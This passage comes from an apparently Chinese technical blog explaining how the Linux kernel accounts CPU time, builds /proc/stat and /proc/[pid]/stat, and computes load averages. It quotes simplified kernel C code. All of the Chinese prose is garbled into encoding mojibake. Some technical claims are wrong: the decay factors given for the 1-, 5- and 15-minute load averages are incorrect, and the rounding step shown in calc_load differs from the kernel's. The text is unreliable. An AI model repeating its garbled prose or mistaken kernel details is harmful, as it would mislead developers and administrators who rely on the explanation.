    <span class="hljs-comment">// 2. æ ¹æ® nice å€¼å†³å®šç´¯åŠ åˆ°å“ªä¸ªå…¨å±€ç»Ÿè®¡</span>
    <span class="hljs-type">int</span> index = (task_nice(p) &gt; <span class="hljs-number">0</span>) ? CPUTIME_NICE : CPUTIME_USER;
    
    <span class="hljs-comment">// 3. ç´¯åŠ åˆ°å…¨å±€ CPU ç»Ÿè®¡</span>
    task_group_account_field(p, index, cputime);
    
    <span class="hljs-comment">// 4. æ›´æ–°è¿›ç¨‹ä¼šè®¡ä¿¡æ¯</span>
    acct_account_cputime(p);
}
</code></pre>
<p><strong>è¯¦ç»†æ­¥éª¤è¯´æ˜</strong>ï¼š</p>
<ol>
<li>
<p><strong>æ›´æ–°è¿›ç¨‹ç»Ÿè®¡</strong>ï¼š</p>
<ul>
<li><strong><code>p-&gt;utime += cputime</code></strong>ï¼šç´¯åŠ è¿›ç¨‹çš„ç”¨æˆ·ç©ºé—´ CPU æ—¶é—´</li>
<li><strong><code>account_group_user_time()</code></strong>ï¼šæ›´æ–°è¿›ç¨‹ç»„çš„ç”¨æˆ·ç©ºé—´æ—¶é—´</li>
<li><strong>ä½œç”¨</strong>ï¼šç”¨äº <code>/proc/[pid]/stat</code> ä¸­çš„ utime å­—æ®µ</li>
</ul>
</li>
<li>
<p><strong>æ›´æ–°å…¨å±€ç»Ÿè®¡</strong>ï¼š</p>
<ul>
<li><strong><code>task_group_account_field()</code></strong>ï¼šæ›´æ–°å…¨å±€ CPU ç»Ÿè®¡</li>
<li><strong>æ ¹æ® nice å€¼</strong>ï¼š
<ul>
<li>nice &gt; 0ï¼šç´¯åŠ åˆ° <code>CPUTIME_NICE</code></li>
<li>nice &lt;= 0ï¼šç´¯åŠ åˆ° <code>CPUTIME_USER</code></li>
</ul>
</li>
<li><strong>ä½œç”¨</strong>ï¼šç”¨äº <code>/proc/stat</code> ä¸­çš„ user å’Œ nice å­—æ®µ</li>
</ul>
</li>
<li>
<p><strong>æ•°æ®ç»“æ„</strong>ï¼š</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// æ¯ä¸ª CPU çš„ç»Ÿè®¡ä¿¡æ¯</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kernel_cpustat</span> {</span>
    u64 cpustat[NR_STATS];
};

<span class="hljs-comment">// ç»Ÿè®¡ç±»å‹</span>
<span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">cpu_usage_stat</span> {</span>
    CPUTIME_USER,
    CPUTIME_NICE,
    CPUTIME_SYSTEM,
    CPUTIME_SOFTIRQ,
    CPUTIME_IRQ,
    CPUTIME_IDLE,
    CPUTIME_IOWAIT,
    CPUTIME_STEAL,
    CPUTIME_GUEST,
    CPUTIME_GUEST_NICE,
    NR_STATS
};
</code></pre>
</li>
</ol>
<h3 data-id="heading-6">2.3 account_system_time() çš„è¯¦ç»†å®ç°</h3>
<p><strong>account_system_time() çš„ä½œç”¨</strong>ï¼š</p>
<p>å°†å†…æ ¸ç©ºé—´çš„ CPU æ—¶é—´ç´¯åŠ åˆ°è¿›ç¨‹å’Œå…¨å±€ç»Ÿè®¡ä¸­ï¼Œå¹¶æ ¹æ®ä¸­æ–­çŠ¶æ€å†³å®šç´¯åŠ åˆ°å“ªä¸ªç»Ÿè®¡ç±»å‹ã€‚</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// kernel/sched/cputime.c</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">account_system_time</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *p, <span class="hljs-type">int</span> hardirq_offset, u64 cputime)</span>
{
    <span class="hljs-type">int</span> index;
    
    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ˜¯è™šæ‹Ÿæœºæ—¶é—´</span>
    <span class="hljs-keyword">if</span> ((p-&gt;flags &amp; PF_VCPU) &amp;&amp; (irq_count() - hardirq_offset == <span class="hljs-number">0</span>)) {
        account_guest_time(p, cputime);
        <span class="hljs-keyword">return</span>;
    }
    
    <span class="hljs-comment">// æ ¹æ®ä¸­æ–­çŠ¶æ€å†³å®šç»Ÿè®¡ç±»å‹</span>
    <span class="hljs-keyword">if</span> (hardirq_count() - hardirq_offset)
        index = CPUTIME_IRQ;  <span class="hljs-comment">// ç¡¬ä»¶ä¸­æ–­</span>
    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (in_serving_softirq())
        index = CPUTIME_SOFTIRQ;  <span class="hljs-comment">// è½¯ä»¶ä¸­æ–­</span>
    <span class="hljs-keyword">else</span>
        index = CPUTIME_SYSTEM;  <span class="hljs-comment">// æ™®é€šå†…æ ¸æ—¶é—´</span>
    
    account_system_index_time(p, cputime, index);
}
</code></pre>
<p><strong>è¯¦ç»†æ­¥éª¤è¯´æ˜</strong>ï¼š</p>
<ol>
<li>
<p><strong>æ£€æŸ¥è™šæ‹Ÿæœºæ—¶é—´</strong>ï¼š</p>
<ul>
<li>å¦‚æœè¿›ç¨‹æ ‡å¿—åŒ…å« <code>PF_VCPU</code> ä¸”ä¸åœ¨ä¸­æ–­ä¸­ï¼Œç»Ÿè®¡ä¸ºè™šæ‹Ÿæœºæ—¶é—´</li>
</ul>
</li>
<li>
<p><strong>æ ¹æ®ä¸­æ–­çŠ¶æ€åˆ†ç±»</strong>ï¼š</p>
<ul>
<li><strong>ç¡¬ä»¶ä¸­æ–­</strong>ï¼š<code>hardirq_count() &gt; 0</code> â†’ <code>CPUTIME_IRQ</code></li>
<li><strong>è½¯ä»¶ä¸­æ–­</strong>ï¼š<code>in_serving_softirq()</code> â†’ <code>CPUTIME_SOFTIRQ</code></li>
<li><strong>æ™®é€šå†…æ ¸æ—¶é—´</strong>ï¼šå…¶ä»–æƒ…å†µ â†’ <code>CPUTIME_SYSTEM</code></li>
</ul>
</li>
<li>
<p><strong>æ›´æ–°ç»Ÿè®¡</strong>ï¼š</p>
<ul>
<li><strong><code>account_system_index_time()</code></strong>ï¼šç´¯åŠ åˆ°è¿›ç¨‹å’Œå…¨å±€ç»Ÿè®¡</li>
<li><strong><code>p-&gt;stime += cputime</code></strong>ï¼šç´¯åŠ è¿›ç¨‹çš„å†…æ ¸ç©ºé—´æ—¶é—´</li>
</ul>
</li>
</ol>
<h3 data-id="heading-7">2.4 account_idle_time() çš„è¯¦ç»†å®ç°</h3>
<p><strong>account_idle_time() çš„ä½œç”¨</strong>ï¼š</p>
<p>ç»Ÿè®¡ CPU ç©ºé—²æ—¶é—´ï¼Œå¹¶æ ¹æ® I/O ç­‰å¾…çŠ¶æ€å†³å®šæ˜¯ç©ºé—²è¿˜æ˜¯ I/O ç­‰å¾…ã€‚</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// kernel/sched/cputime.c</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">account_idle_time</span><span class="hljs-params">(u64 cputime)</span>
{
    u64 *cpustat = kcpustat_this_cpu-&gt;cpustat;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rq</span> *<span class="hljs-title">rq</span> =</span> this_rq();
    
    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æœ‰è¿›ç¨‹åœ¨ç­‰å¾… I/O</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-type">atomic_read</span>(&amp;rq-&gt;nr_iowait) &gt; <span class="hljs-number">0</span>)
        cpustat[CPUTIME_IOWAIT] += cputime;  <span class="hljs-comment">// I/O ç­‰å¾…</span>
    <span class="hljs-keyword">else</span>
        cpustat[CPUTIME_IDLE] += cputime;  <span class="hljs-comment">// ç©ºé—²</span>
}
</code></pre>
<p><strong>è¯¦ç»†æ­¥éª¤è¯´æ˜</strong>ï¼š</p>
<ol>
<li>
<p><strong>æ£€æŸ¥ I/O ç­‰å¾…</strong>ï¼š</p>
<ul>
<li><strong><code>rq-&gt;nr_iowait</code></strong>ï¼šè¿è¡Œé˜Ÿåˆ—ä¸­ç­‰å¾… I/O çš„è¿›ç¨‹æ•°</li>
<li>å¦‚æœæœ‰è¿›ç¨‹ç­‰å¾… I/Oï¼Œç»Ÿè®¡ä¸º <code>CPUTIME_IOWAIT</code></li>
<li>å¦åˆ™ç»Ÿè®¡ä¸º <code>CPUTIME_IDLE</code></li>
</ul>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆåŒºåˆ† I/O ç­‰å¾…å’Œç©ºé—²</strong>ï¼š</p>
<ul>
<li><strong>I/O ç­‰å¾…</strong>ï¼šCPU ç©ºé—²æ˜¯å› ä¸ºç­‰å¾… I/O å®Œæˆï¼Œå¯èƒ½è¡¨ç¤º I/O ç“¶é¢ˆ</li>
<li><strong>ç©ºé—²</strong>ï¼šCPU ç©ºé—²æ˜¯å› ä¸ºæ²¡æœ‰å¯è¿è¡Œçš„è¿›ç¨‹</li>
</ul>
</li>
</ol>
<h3 data-id="heading-8">2.5 /proc/stat çš„ç”ŸæˆåŸç†</h3>
<p><strong>show_stat() å‡½æ•°</strong>ï¼š</p>
<p><code>/proc/stat</code> æ–‡ä»¶ç”± <code>show_stat()</code> å‡½æ•°ç”Ÿæˆï¼Œå®ƒéå†æ‰€æœ‰ CPUï¼Œæ±‡æ€»ç»Ÿè®¡ä¿¡æ¯ã€‚</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// fs/proc/stat.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">show_stat</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *p, <span class="hljs-type">void</span> *v)</span>
{
    u64 user, nice, system, idle, iowait, irq, softirq, steal;
    u64 guest, guest_nice;
    
    <span class="hljs-comment">// åˆå§‹åŒ–</span>
    user = nice = system = idle = iowait = irq = softirq = steal = <span class="hljs-number">0</span>;
    guest = guest_nice = <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// éå†æ‰€æœ‰ CPUï¼Œç´¯åŠ ç»Ÿè®¡</span>
    for_each_possible_cpu(i) {
        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kernel_cpustat</span> <span class="hljs-title">kcpustat</span>;</span>
        u64 *cpustat = kcpustat.cpustat;
        
        <span class="hljs-comment">// è·å– CPU ç»Ÿè®¡ä¿¡æ¯</span>
        kcpustat_cpu_fetch(&amp;kcpustat, i);
        
        <span class="hljs-comment">// ç´¯åŠ å„é¡¹ç»Ÿè®¡</span>
        user    += cpustat[CPUTIME_USER];
        nice    += cpustat[CPUTIME_NICE];
        system  += cpustat[CPUTIME_SYSTEM];
        idle    += get_idle_time(&amp;kcpustat, i);
        iowait  += get_iowait_time(&amp;kcpustat, i);
        irq     += cpustat[CPUTIME_IRQ];
        softirq += cpustat[CPUTIME_SOFTIRQ];
        steal   += cpustat[CPUTIME_STEAL];
        guest   += cpustat[CPUTIME_GUEST];
        guest_nice += cpustat[CPUTIME_GUEST_NICE];
    }
    
    <span class="hljs-comment">// è¾“å‡ºæ±‡æ€»ç»Ÿè®¡ï¼ˆcpu è¡Œï¼‰</span>
    seq_put_decimal_ull(p, <span class="hljs-string">"cpu  "</span>, <span class="hljs-type">nsec_to_clock_t</span>(user));
    seq_put_decimal_ull(p, <span class="hljs-string">" "</span>, <span class="hljs-type">nsec_to_clock_t</span>(nice));
    <span class="hljs-comment">// ... å…¶ä»–å­—æ®µ</span>
    
    <span class="hljs-comment">// è¾“å‡ºæ¯ä¸ª CPU çš„ç»Ÿè®¡ï¼ˆcpu0, cpu1, ...ï¼‰</span>
    for_each_online_cpu(i) {
        <span class="hljs-comment">// ... ç±»ä¼¼å¤„ç†</span>
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p><strong>å…³é”®ç‚¹</strong>ï¼š</p>
<ol>
<li><strong>å®æ—¶è®¡ç®—</strong>ï¼šæ¯æ¬¡è¯»å– <code>/proc/stat</code> æ—¶ï¼Œå†…æ ¸å®æ—¶æ±‡æ€»æ‰€æœ‰ CPU çš„ç»Ÿè®¡</li>
<li><strong>æ—¶é—´å•ä½è½¬æ¢</strong>ï¼š<code>nsec_to_clock_t()</code> å°†çº³ç§’è½¬æ¢ä¸ºæ—¶é’Ÿå‘¨æœŸï¼ˆjiffiesï¼‰</li>
<li><strong>NO_HZ å¤„ç†</strong>ï¼š<code>get_idle_time()</code> å’Œ <code>get_iowait_time()</code> å¤„ç† NO_HZ æ¨¡å¼ä¸‹çš„æ—¶é—´ç»Ÿè®¡</li>
</ol>
<h3 data-id="heading-9">2.6 å·¥å…·å¦‚ä½•è®¡ç®— CPU ä½¿ç”¨ç‡</h3>
<p><strong>top/mpstat çš„è®¡ç®—æ–¹å¼</strong>ï¼š</p>
<p>å·¥å…·è¯»å–ä¸¤æ¬¡ <code>/proc/stat</code>ï¼Œè®¡ç®—å·®å€¼ï¼Œç„¶åè®¡ç®—ç™¾åˆ†æ¯”ã€‚</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ä¼ªä»£ç ç¤ºä¾‹</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">calculate_cpu_usage</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
{
    <span class="hljs-comment">// ç¬¬ä¸€æ¬¡è¯»å–</span>
    read_proc_stat(&amp;stat1);
    
    sleep(<span class="hljs-number">1</span>);  <span class="hljs-comment">// ç­‰å¾… 1 ç§’</span>
    
    <span class="hljs-comment">// ç¬¬äºŒæ¬¡è¯»å–</span>
    read_proc_stat(&amp;stat2);
    
    <span class="hljs-comment">// è®¡ç®—å·®å€¼</span>
    total = (stat2.user - stat1.user) +
            (stat2.nice - stat1.nice) +
            (stat2.system - stat1.system) +
            (stat2.idle - stat1.idle) +
            (stat2.iowait - stat1.iowait) +
            (stat2.irq - stat1.irq) +
            (stat2.softirq - stat1.softirq) +
            (stat2.steal - stat1.steal);
    
    <span class="hljs-comment">// è®¡ç®—ç™¾åˆ†æ¯”</span>
    user_percent = (stat2.user - stat1.user) * <span class="hljs-number">100.0</span> / total;
    system_percent = (stat2.system - stat1.system) * <span class="hljs-number">100.0</span> / total;
    idle_percent = (stat2.idle - stat1.idle) * <span class="hljs-number">100.0</span> / total;
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<p><strong>å…³é”®ç‚¹</strong>ï¼š</p>
<ol>
<li><strong>å·®å€¼è®¡ç®—</strong>ï¼šCPU ä½¿ç”¨ç‡æ˜¯æ—¶é—´å·®å€¼çš„ç™¾åˆ†æ¯”ï¼Œä¸æ˜¯ç»å¯¹å€¼çš„ç™¾åˆ†æ¯”</li>
<li><strong>æ—¶é—´å•ä½</strong>ï¼šç»Ÿè®¡å€¼ä»¥æ—¶é’Ÿå‘¨æœŸï¼ˆjiffiesï¼‰ä¸ºå•ä½ï¼Œéœ€è¦è½¬æ¢ä¸ºçº³ç§’æˆ–ç§’</li>
<li><strong>å¤šæ ¸ç³»ç»Ÿ</strong>ï¼šæ¯ä¸ª CPU æ ¸å¿ƒå•ç‹¬è®¡ç®—ï¼Œæˆ–æ±‡æ€»åè®¡ç®—å¹³å‡å€¼</li>
</ol>
<hr/>
<h2 data-id="heading-10">3. ç³»ç»Ÿè´Ÿè½½å¹³å‡å€¼ç»Ÿè®¡åŸç†</h2>
<h3 data-id="heading-11">3.1 è´Ÿè½½å¹³å‡å€¼çš„å®šä¹‰</h3>
<p><strong>è´Ÿè½½å¹³å‡å€¼æ˜¯ä»€ä¹ˆ</strong>ï¼š</p>
<p>è´Ÿè½½å¹³å‡å€¼æ˜¯ç³»ç»Ÿä¸­å¯è¿è¡Œè¿›ç¨‹å’Œä¸å¯ä¸­æ–­è¿›ç¨‹çš„å¹³å‡æ•°é‡ï¼Œæ˜¯ä¸€ä¸ªæŒ‡æ•°è¡°å‡å¹³å‡å€¼ã€‚</p>
<p><strong>å…¬å¼</strong>ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">load</span>(t) = <span class="hljs-built_in">load</span>(t-<span class="hljs-number">1</span>) * <span class="hljs-built_in">exp</span>(-<span class="hljs-number">5</span>/<span class="hljs-number">60</span>) + n * (<span class="hljs-number">1</span> - exp(-<span class="hljs-number">5</span>/<span class="hljs-number">60</span>))
</code></pre>
<p>å…¶ä¸­ï¼š</p>
<ul>
<li><code>load(t)</code>ï¼šå½“å‰è´Ÿè½½å€¼</li>
<li><code>load(t-1)</code>ï¼šä¸Šä¸€æ¬¡è´Ÿè½½å€¼</li>
<li><code>n</code>ï¼šå½“å‰æ´»è·ƒè¿›ç¨‹æ•°ï¼ˆnr_running + nr_uninterruptibleï¼‰</li>
<li><code>exp(-5/60)</code>ï¼šè¡°å‡å› å­ï¼ˆ5 åˆ†é’Ÿè´Ÿè½½ï¼‰</li>
</ul>
<p><strong>ä¸‰ç§è´Ÿè½½å¹³å‡å€¼</strong>ï¼š</p>
<ol>
<li><strong>1 åˆ†é’Ÿè´Ÿè½½</strong>ï¼š<code>exp(-1/60)</code>ï¼Œåæ˜ çŸ­æœŸè´Ÿè½½</li>
<li><strong>5 åˆ†é’Ÿè´Ÿè½½</strong>ï¼š<code>exp(-5/60)</code>ï¼Œåæ˜ ä¸­æœŸè´Ÿè½½</li>
<li><strong>15 åˆ†é’Ÿè´Ÿè½½</strong>ï¼š<code>exp(-15/60)</code>ï¼Œåæ˜ é•¿æœŸè´Ÿè½½</li>
</ol>
<h3 data-id="heading-12">3.2 è´Ÿè½½å¹³å‡å€¼çš„è®¡ç®—åŸç†</h3>
<p><strong>calc_global_load() å‡½æ•°</strong>ï¼š</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// kernel/sched/loadavg.c</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">calc_global_load</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
{
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sample_window;
    <span class="hljs-type">long</span> active, delta;
    
    sample_window = READ_ONCE(calc_load_update);
    <span class="hljs-keyword">if</span> (time_before(jiffies, sample_window + <span class="hljs-number">10</span>))
        <span class="hljs-keyword">return</span>;
    
    <span class="hljs-comment">// å¤„ç† NO_HZ æ¨¡å¼ä¸‹çš„å¢é‡</span>
    delta = calc_load_nohz_read();
    <span class="hljs-keyword">if</span> (delta)
        atomic_long_add(delta, &amp;calc_load_tasks);
    
    <span class="hljs-comment">// è·å–å½“å‰æ´»è·ƒè¿›ç¨‹æ•°</span>
    active = atomic_long_read(&amp;calc_load_tasks);
    active = active &gt; <span class="hljs-number">0</span> ? active * FIXED_1 : <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// æ›´æ–°ä¸‰ç§è´Ÿè½½å¹³å‡å€¼</span>
    avenrun[<span class="hljs-number">0</span>] = calc_load(avenrun[<span class="hljs-number">0</span>], EXP_1, active);   <span class="hljs-comment">// 1 åˆ†é’Ÿ</span>
    avenrun[<span class="hljs-number">1</span>] = calc_load(avenrun[<span class="hljs-number">1</span>], EXP_5, active);   <span class="hljs-comment">// 5 åˆ†é’Ÿ</span>
    avenrun[<span class="hljs-number">2</span>] = calc_load(avenrun[<span class="hljs-number">2</span>], EXP_15, active);  <span class="hljs-comment">// 15 åˆ†é’Ÿ</span>
    
    WRITE_ONCE(calc_load_update, sample_window + LOAD_FREQ);
}
</code></pre>
<p><strong>calc_load() å‡½æ•°</strong>ï¼š</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// kernel/sched/loadavg.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>
<span class="hljs-title function_">calc_load</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> load, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-built_in">exp</span>, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> active)</span>
{
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> newload;
    
    newload = load * <span class="hljs-built_in">exp</span> + active * (FIXED_1 - <span class="hljs-built_in">exp</span>);
    <span class="hljs-keyword">if</span> (active &gt;= load)
        newload += FIXED_1 - <span class="hljs-built_in">exp</span>;
    
    <span class="hljs-keyword">return</span> newload &gt;&gt; FSHIFT;
}
</code></pre>
<p><strong>è¯¦ç»†æ­¥éª¤è¯´æ˜</strong>ï¼š</p>
<ol>
<li>
<p><strong>æ”¶é›†æ´»è·ƒè¿›ç¨‹æ•°</strong>ï¼š</p>
<ul>
<li><strong><code>calc_load_tasks</code></strong>ï¼šå…¨å±€åŸå­å˜é‡ï¼Œç´¯åŠ æ‰€æœ‰ CPU çš„æ´»è·ƒè¿›ç¨‹æ•°</li>
<li><strong>æ´»è·ƒè¿›ç¨‹æ•°</strong>ï¼š<code>nr_running + nr_uninterruptible</code></li>
</ul>
</li>
<li>
<p><strong>æŒ‡æ•°è¡°å‡è®¡ç®—</strong>ï¼š</p>
<ul>
<li><strong>å…¬å¼</strong>ï¼š<code>newload = load * exp + active * (1 - exp)</code></li>
<li><strong>exp</strong>ï¼šè¡°å‡å› å­ï¼ˆEXP_1, EXP_5, EXP_15ï¼‰</li>
<li><strong>ä½œç”¨</strong>ï¼šå¹³æ»‘è´Ÿè½½å€¼ï¼Œé¿å…å‰§çƒˆæ³¢åŠ¨</li>
</ul>
</li>
<li>
<p><strong>æ›´æ–°é¢‘ç‡</strong>ï¼š</p>
<ul>
<li><strong>LOAD_FREQ</strong>ï¼šæ¯ 5 ç§’æ›´æ–°ä¸€æ¬¡ï¼ˆ5 * HZï¼‰</li>
<li><strong>å»¶è¿Ÿæ›´æ–°</strong>ï¼šç­‰å¾… 10 ä¸ªæ—¶é’Ÿå‘¨æœŸï¼Œç¡®ä¿æ‰€æœ‰ CPU éƒ½æ›´æ–°äº†</li>
</ul>
</li>
</ol>
<h3 data-id="heading-13">3.3 æ¯ä¸ª CPU çš„è´Ÿè½½è´¡çŒ®</h3>
<p><strong>calc_global_load_tick() å‡½æ•°</strong>ï¼š</p>
<p>æ¯ä¸ª CPU åœ¨æ—¶é’Ÿä¸­æ–­æ—¶æ›´æ–°è‡ªå·±çš„è´Ÿè½½è´¡çŒ®ã€‚</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// kernel/sched/loadavg.c</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">calc_global_load_tick</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> rq *this_rq)</span>
{
    <span class="hljs-type">long</span> delta;
    
    <span class="hljs-keyword">if</span> (time_before(jiffies, this_rq-&gt;calc_load_update))
        <span class="hljs-keyword">return</span>;
    
    <span class="hljs-comment">// è®¡ç®—æ´»è·ƒè¿›ç¨‹æ•°çš„å¢é‡</span>
    delta = calc_load_fold_active(this_rq, <span class="hljs-number">0</span>);
    <span class="hljs-keyword">if</span> (delta)
        atomic_long_add(delta, &amp;calc_load_tasks);
    
    this_rq-&gt;calc_load_update += LOAD_FREQ;
}
</code></pre>
<p><strong>calc_load_fold_active() å‡½æ•°</strong>ï¼š</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// kernel/sched/loadavg.c</span>
<span class="hljs-type">long</span> <span class="hljs-title function_">calc_load_fold_active</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> rq *this_rq, <span class="hljs-type">long</span> adjust)</span>
{
    <span class="hljs-type">long</span> nr_active, delta = <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// è®¡ç®—å½“å‰æ´»è·ƒè¿›ç¨‹æ•°</span>
    nr_active = this_rq-&gt;nr_running - adjust;
    nr_active += (<span class="hljs-type">int</span>)this_rq-&gt;nr_uninterruptible;
    
    <span class="hljs-comment">// è®¡ç®—ä¸ä¸Šæ¬¡çš„å·®å€¼</span>
    <span class="hljs-keyword">if</span> (nr_active != this_rq-&gt;calc_load_active) {
        delta = nr_active - this_rq-&gt;calc_load_active;
        this_rq-&gt;calc_load_active = nr_active;
    }
    
    <span class="hljs-keyword">return</span> delta;
}
</code></pre>
<p><strong>è¯¦ç»†æ­¥éª¤è¯´æ˜</strong>ï¼š</p>
<ol>
<li>
<p><strong>è®¡ç®—å¢é‡</strong>ï¼š</p>
<ul>
<li><strong><code>nr_active</code></strong>ï¼šå½“å‰ CPU çš„æ´»è·ƒè¿›ç¨‹æ•°</li>
<li><strong><code>delta</code></strong>ï¼šä¸ä¸Šæ¬¡çš„å·®å€¼</li>
<li><strong>ä½œç”¨</strong>ï¼šåªç´¯åŠ å˜åŒ–é‡ï¼Œå‡å°‘åŒæ­¥å¼€é”€</li>
</ul>
</li>
<li>
<p><strong>ç´¯åŠ åˆ°å…¨å±€</strong>ï¼š</p>
<ul>
<li><strong><code>atomic_long_add()</code></strong>ï¼šåŸå­æ“ä½œï¼Œç´¯åŠ åˆ°å…¨å±€å˜é‡</li>
<li><strong>ä½œç”¨</strong>ï¼šæ‰€æœ‰ CPU çš„å¢é‡ç´¯åŠ åï¼Œå¾—åˆ°å…¨å±€æ´»è·ƒè¿›ç¨‹æ•°</li>
</ul>
</li>
<li>
<p><strong>æ›´æ–°é¢‘ç‡</strong>ï¼š</p>
<ul>
<li>æ¯ä¸ª CPU æ¯ 5 ç§’æ›´æ–°ä¸€æ¬¡</li>
<li>å…¨å±€è´Ÿè½½æ¯ 5 ç§’è®¡ç®—ä¸€æ¬¡</li>
</ul>
</li>
</ol>
<h3 data-id="heading-14">3.4 /proc/loadavg çš„ç”Ÿæˆ</h3>
<p><strong>get_avenrun() å‡½æ•°</strong>ï¼š</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// kernel/sched/loadavg.c</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">get_avenrun</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *loads, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> offset, <span class="hljs-type">int</span> shift)</span>
{
    loads[<span class="hljs-number">0</span>] = (avenrun[<span class="hljs-number">0</span>] + offset) &lt;&lt; shift;
    loads[<span class="hljs-number">1</span>] = (avenrun[<span class="hljs-number">1</span>] + offset) &lt;&lt; shift;
    loads[<span class="hljs-number">2</span>] = (avenrun[<span class="hljs-number">2</span>] + offset) &lt;&lt; shift;
}
</code></pre>
<p><strong>/proc/loadavg çš„æ ¼å¼</strong>ï¼š</p>
<pre><code class="hljs">0.52 0.58 0.61 2/285 12345
</code></pre>
<ul>
<li><strong>0.52</strong>ï¼š1 åˆ†é’Ÿè´Ÿè½½</li>
<li><strong>0.58</strong>ï¼š5 åˆ†é’Ÿè´Ÿè½½</li>
<li><strong>0.61</strong>ï¼š15 åˆ†é’Ÿè´Ÿè½½</li>
<li><strong>2/285</strong>ï¼šå½“å‰è¿è¡Œè¿›ç¨‹æ•° / æ€»è¿›ç¨‹æ•°</li>
<li><strong>12345</strong>ï¼šæœ€è¿‘åˆ›å»ºçš„è¿›ç¨‹ PID</li>
</ul>
<hr/>
<h2 data-id="heading-15">4. è¿›ç¨‹ç»Ÿè®¡ä¿¡æ¯ç”ŸæˆåŸç†</h2>
<h3 data-id="heading-16">4.1 /proc/[pid]/stat çš„ç”Ÿæˆ</h3>
<p><strong>do_task_stat() å‡½æ•°</strong>ï¼š</p>
<p><code>/proc/[pid]/stat</code> æ–‡ä»¶ç”± <code>do_task_stat()</code> å‡½æ•°ç”Ÿæˆï¼Œå®ƒä» <code>task_struct</code> ä¸­è¯»å–å„ç§ç»Ÿè®¡ä¿¡æ¯ã€‚</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// fs/proc/array.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_task_stat</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-keyword">struct</span> pid_namespace *ns,
                        <span class="hljs-keyword">struct</span> pid *pid, <span class="hljs-keyword">struct</span> task_struct *task, <span class="hljs-type">int</span> whole)</span>
{
    <span class="hljs-comment">// 1. è·å–è¿›ç¨‹åŸºæœ¬ä¿¡æ¯</span>
    <span class="hljs-type">pid_t</span> ppid = task_tgid_nr_ns(task-&gt;real_parent, ns);
    <span class="hljs-type">pid_t</span> tgid = task_tgid_nr_ns(task, ns);
    
    <span class="hljs-comment">// 2. è·å– CPU æ—¶é—´</span>
    task_cputime_adjusted(task, &amp;utime, &amp;stime);
    
    <span class="hljs-comment">// 3. è·å–å†…å­˜ä¿¡æ¯</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> get_task_mm(task);
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> vsize = mm ? mm-&gt;total_vm : <span class="hljs-number">0</span>;
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rss = mm ? get_mm_rss(mm) : <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// 4. è¾“å‡ºæ‰€æœ‰å­—æ®µ</span>
    seq_put_decimal_ull(m, <span class="hljs-string">""</span>, pid_nr_ns(pid, ns));  <span class="hljs-comment">// PID</span>
    seq_puts(m, <span class="hljs-string">" ("</span>);
    proc_task_name(m, task, <span class="hljs-literal">false</span>);  <span class="hljs-comment">// è¿›ç¨‹å</span>
    seq_puts(m, <span class="hljs-string">") "</span>);
    seq_putc(m, state);  <span class="hljs-comment">// çŠ¶æ€</span>
    seq_put_decimal_ll(m, <span class="hljs-string">" "</span>, ppid);  <span class="hljs-comment">// çˆ¶è¿›ç¨‹ PID</span>
    <span class="hljs-comment">// ... å…¶ä»–å­—æ®µ</span>
